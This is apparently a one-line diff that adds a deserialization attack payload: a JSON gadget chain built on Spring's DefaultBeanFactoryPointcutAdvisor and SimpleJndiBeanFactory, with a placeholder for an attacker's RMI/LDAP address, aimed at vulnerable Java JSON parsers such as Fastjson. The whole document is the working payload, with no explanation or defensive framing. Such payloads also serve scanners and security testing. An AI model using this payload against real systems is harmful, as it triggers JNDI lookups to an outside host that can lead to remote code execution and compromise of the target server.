@@ -1,0 +1,1 @@
+Set [{"@type":"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor","beanFactory":{"@type":"org.springframework.jndi.support.SimpleJndiBeanFactory","shareableResources":["###RMI_LDAP_ADDRESS###"]},"adviceBeanName":"###RMI_LDAP_ADDRESS###"},{"@type":"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor",}]
